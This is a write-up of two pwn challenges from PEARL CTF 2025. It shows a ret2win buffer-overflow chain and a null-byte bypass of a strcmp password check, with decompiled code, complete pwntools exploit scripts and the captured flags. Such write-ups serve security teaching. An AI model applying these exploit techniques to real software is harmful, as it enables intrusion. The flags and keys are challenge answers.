---
title: PEARL CTF 2025 WRITEUP
author: ywdh
tags: ["ctf"]
date: 2025-03-07
---

# PEARL CTF 2025 WRITEUP

[TOC]

# Pwn

## Treasure Hunt

### Description

<details>
Are you worthy enough to get the treasure? Let's see...
nc treasure-hunt.ctf.pearlctf.in 30008
</details>

### Solve Walkthrough

-   This is a classic ret2win challenge.
- First, I check the ELF protection with `checksec`.

```bash
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

- The binary only have the NX / DEP protection, which means that we **can't inject a shellcode**. Let's decompile the binary using Ghidra.
- We got a bunch of interesting functions here.

![Treasure Hunt-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/pearl-ctf_pwn1-01.png)

- Here's a decompiled code of all known functions in `vuln.c`.

```c=
undefined8 main(void)

{
  setup();
  puts("Welcome, traveler! Your quest for the Key of Eternity begins now...");
  enchanted_forest();
  desert_of_sands();
  ruins_of_eldoria();
  caverns_of_eternal_darkness();
  chamber_of_eternity();
  return 0;
}

undefined8 check_key(int param_1,char *param_2)

{
  int iVar1;
  undefined4 extraout_var;
  char *local_38 [4];
  char *local_18;
  
  local_38[0] = "whisp3ring_w00ds";
  local_38[1] = "sc0rching_dunes";
  local_38[2] = "eldorian_ech0";
  local_38[3] = "shadow_4byss";
  local_18 = "3ternal_light";
  iVar1 = strcmp(param_2,local_38[param_1]);
  return CONCAT71((int7)(CONCAT44(extraout_var,iVar1) >> 8),iVar1 == 0);
}

void enchanted_forest(void)

{
  char cVar1;
  undefined1 local_48 [64];
  
  puts("\nLevel 1: The Enchanted Forest");
  puts(
      "Towering trees weave a dense canopy, filtering ethereal light. Ancient roots twist like serpe nts beneath your feet, hiding secrets of old."
      );
  puts("The spirits whisper secrets among the trees.");
  printf("Enter the mystery key to proceed: ");
  __isoc99_scanf(&DAT_00402173,local_48);
  cVar1 = check_key(0,local_48);
  if (cVar1 != '\x01') {
    puts("Wrong key! You are lost in the Enchanted Forest forever...");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Correct! You have passed The Enchanted Forest.");
  return;
}

void desert_of_sands(void)

{
  char cVar1;
  undefined1 local_48 [64];
  
  puts("\nLevel 2: The Desert of Sands");
  puts(
      "Golden dunes stretch endlessly, the sun burning with relentless fury. Shadows of ancient ruin s break the monotony, hinting at secrets buried beneath the sands."
      );
  puts("The scorching winds test your resolve.");
  printf("Enter the mystery key to proceed: ");
  __isoc99_scanf(&DAT_00402173,local_48);
  cVar1 = check_key(1,local_48);
  if (cVar1 != '\x01') {
    puts("Wrong key! You are lost in the Desert of Sands forever...");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Correct! You have passed The Desert of Sands.");
  return;
}

void ruins_of_eldoria(void)

{
  char cVar1;
  undefined1 local_48 [64];
  
  puts("\nLevel 3: The Ruins of Eldoria");
  puts(
      "Once a grand citadel, now reduced to crumbling stones. Arcane symbols glow faintly, whisperin g forgotten knowledge in the language of the ancients."
      );
  puts("Echoes of ancient wisdom guide your path.");
  printf("Enter the mystery key to proceed: ");
  __isoc99_scanf(&DAT_00402173,local_48);
  cVar1 = check_key(2,local_48);
  if (cVar1 != '\x01') {
    puts("Wrong key! You are lost in the Ruins of Eldoria forever...");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Correct! You have passed The Ruins of Eldoria.");
  return;
}

void caverns_of_eternal_darkness(void)

{
  char cVar1;
  undefined1 local_48 [64];
  
  puts("\nLevel 4: The Caverns of Eternal Darkness");
  puts(
      "The air is thick with an eerie silence, broken only by the distant drip of unseen waters. You r torch flickers as shadows coil and dance along the jagged walls."
      );
  puts(&DAT_00402568);
  printf("Enter the mystery key to proceed: ");
  __isoc99_scanf(&DAT_00402173,local_48);
  cVar1 = check_key(3,local_48);
  if (cVar1 != '\x01') {
    puts("Wrong key! You are lost in the Caverns of Eternal Darkness forever...");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Correct! You have passed The Caverns of Eternal Darkness.");
  return;
}

void chamber_of_eternity(void)
{
  char local_48 [64];
  
  puts("\nLevel 5: The Chamber of Eternity");
  puts(
      "A vast chamber bathed in celestial light. The Key of Eternity hovers at its center, pulsing w ith cosmic energy, awaiting the one deemed worthy."
      );
  puts("A single light illuminates the Key of Eternity.");
  printf("You are worthy of the final treasure, enter the final key for the win:- ");
  getchar();
  fgets(local_48,500,stdin);
  puts("GGs");
  return;
}

void setEligibility(void)

{
  eligible = 1;
  return;
}

void winTreasure(void)

{
  char local_58 [72];
  FILE *local_10;
  
  if (eligible == '\0') {
    puts("No flag for you!");
  }
  else {
    local_10 = fopen("flag.txt","r");
    fgets(local_58,0x40,local_10);
    puts(local_58);
  }
  return;
}
```

- From all the function symbols above, we can see the pattern in the `main` function that is calling some functions from `unchanted_forest` (**level 1**) until `chamber_of_eternity` (**level 5**).
- What is every level/function does ? It just compared the key in each level. If it's correct, you can go to the next level until you reach out last level, which is level 5.
- After we successfully reach out to the last level, you see in the `chamber_of_eternity` function is happen **BOF vulnerability** in `fgets` function. The buffer is only take **64 Bytes**, but we can input until **500 Bytes**.
- So, the objective is very straighforward. After we at the last level, we can do **ret2win attack** to `winTreasure` function to get the flag.
- But, another problem is we can't directly get the flag until the `eligible` global variable is changed to **1**. How we can change it? Simple, we can jump to the `setEligibility` function first, and then jump to the `winTreasure` function.
- Here's my final exploit script.

```python=
#!/usr/bin/env python3
#filename: exploit.py

from pwn import *

context.binary = elf = ELF("./vuln", checksec=0)
context.log_level = "debug"

# Prepare the payload.
win_addr = p64(elf.symbols['winTreasure'])
set_eligibility = p64(elf.symbols['setEligibility'])

key_lvl1 = b"whisp3ring_w00ds"
key_lvl2 = b"sc0rching_dunes"
key_lvl3 = b"eldorian_ech0"
key_lvl4 = b"shadow_4byss"
key_lvl5 = b"3ternal_light"

payload = b"A"*(64 - len(key_lvl5))
payload += b"B"*8
payload += set_eligibility
payload += win_addr

# Send all valid keys got from check_key function.
is_remote = True

if is_remote:
    io = remote("treasure-hunt.ctf.pearlctf.in", 30008)
else:
    io = elf.process()

# Send the valid key according to it's level.
io.sendline(key_lvl1)
io.sendline(key_lvl2)
io.sendline(key_lvl3)
io.sendline(key_lvl4)

# Send the last valid key for level 5 and also the payload to win_addr.
io.sendline(key_lvl5 + payload)
io.interactive()
```

- If we run the exploit script remotely, we can get a shell.

![Treasure Hunt-02](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/pearl-ctf_pwn1-02.png)

### Flag

<kbd>pearl{k33p_0n_r3turning_l0l}</kbd>

## Readme Please

### Description

<details>
I made a very secure file reading service.

nc readme-please.ctf.pearlctf.in 30039
</details>

### Solve Walkthrough

- This is also a simple pwn challenge, without special technique. Only depends on your logic and knowledge in binary.
- First, after we unzip the source code, let's check the ELF binary protection.

```bash
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

- This is a list of available functions inside the binary.

![Readme Please-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/pearl-ctf_pwn2-01.png)

- We only got 2 interesting function symbols, which is the `main` function and `generate_password` function.
- Here's the decompiled of `main` and `generate_password` functions.

```c=
// main function.
undefined8 main(void)

{
  int iVar1;
  char *pcVar2;
  FILE *__stream;
  long in_FS_OFFSET;
  int local_18c;
  char local_178 [112];
  char local_108 [112];
  char local_98 [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  generate_password(local_98,0x7f);
  printf("Welcome to file reading service!");
  fflush(stdout);
  local_18c = 0;
  do {
    if (1 < local_18c) {
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return 0;
    }
    printf("\nEnter the file name: ");
    fflush(stdout);
    __isoc99_scanf(&DAT_00102088,local_178);
    pcVar2 = __xpg_basename(local_178);
    __stream = fopen(local_178,"r");
    if (__stream == (FILE *)0x0) {
      puts("Please don\'t try anything funny!");
      fflush(stdout);
    }
    else {
      iVar1 = strcmp(pcVar2,"flag.txt");
      if (iVar1 == 0) {
        printf("Enter password: ");
        fflush(stdout);
        __isoc99_scanf(&DAT_00102088,local_108);
        iVar1 = strcmp(local_108,local_98);
        if (iVar1 != 0) {
          puts("Incorrect password!");
          fflush(stdout);
          goto LAB_001015f2;
        }
      }
      while( true ) {
        pcVar2 = fgets(local_108,100,__stream);
        if (pcVar2 == (char *)0x0) break;
        printf("%s",local_108);
        fflush(stdout);
      }
      fclose(__stream);
    }
LAB_001015f2:
    local_18c = local_18c + 1;
  } while( true );
}

void generate_password(void *param_1,ulong param_2)

{
  char cVar1;
  int __fd;
  ulong uVar2;
  ulong local_10;
  
  __fd = open("/dev/urandom",0);
  if (__fd < 0) {
    perror("Failed to open /dev/urandom");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  uVar2 = read(__fd,param_1,param_2);
  if (uVar2 != param_2) {
    perror("Failed to read random bytes");
    close(__fd);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  close(__fd);
  for (local_10 = 0; local_10 < param_2; local_10 = local_10 + 1) {
    cVar1 = *(char *)(local_10 + (long)param_1);
    *(char *)(local_10 + (long)param_1) =
         cVar1 + ((char)((short)(cVar1 * 0x100af) >> 0xe) - (cVar1 >> 7)) * -0x5e + '!';
  }
  *(undefined1 *)(param_2 + (long)param_1) = 0;
  return;
}
```

- Pretty long huh?, but the code is straightforward:
    - First, the code will generate a new password to protect the `files/flag.txt` file that we inputed. The password is randomly generated from `/dev/urandom` file and will be store in `local_98` array with only **112 Bytes**.
    - We've to input the correct path of a target file that we want to read. There are only 3 files that we can read from the remote machine, including `flag.txt`, `default.txt`, and the `note-1.txt` (I aware you not to read this file :v).
    - If we type: `files/flag.txt` , it means that **we've to provide the password**. Otherwise, all files can be read without have to provide a password.
    - **Tips**: Don't get too confused in the password transformation from `/dev/urandom` in the `generate_password` function. _Better leave it_ haha..
    
- Notice that in the `main` function is comparing a string of `local_98` (**generated password**) with a `local_108` (**user input password**).

```c=
  // snipped code.
    if (__stream == (FILE *)0x0) {
      puts("Please don\'t try anything funny!");
      fflush(stdout);
    }
    else {
      iVar1 = strcmp(pcVar2,"flag.txt");
      if (iVar1 == 0) {
        printf("Enter password: ");
        fflush(stdout);
        __isoc99_scanf(&DAT_00102088,local_108);
        iVar1 = strcmp(local_108,local_98); // vuln is happen here.
        if (iVar1 != 0) {
          puts("Incorrect password!");
          fflush(stdout);
          goto LAB_001015f2;
        }
      }
  // snipped code.
```

- How we can bypass the condition? Since it was using the `strcmp` function, so we can send some `\x00` (**NULL Byte**) characters in the input password prompt.
- But, how long the `\x00` characters that we need? It's only `**112**` **Bytes** (**0x70**) until our input is reach the max of array length.
- So, here's my exploit script.

```python=
#!/usr/bin/env python3

from pwn import *
import itertools

context.binary = elf = ELF("./main", checksec=0)
context.log_level = "DEBUG"

is_remote = True

if is_remote:
    io = remote("readme-please.ctf.pearlctf.in", 30039)
else:
    io = elf.process()

# Send first request to read the flag.txt file.
io.sendlineafter(b"Enter the file name: ", b"files/flag.txt")

# Abuse the string comparison with \x00 characters.
io.sendlineafter(b"Enter password: ", b"\x00"*0x70) # 112 Bytes.

print(io.recvall(timeout=1))

# Close the remote connection.
io.close()
```

![Readme Please-02](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/pearl-ctf_pwn2-02.png)

### Flag

<kbd>pearl{f1l3_d3script0rs_4r3_c00l}</kbd>
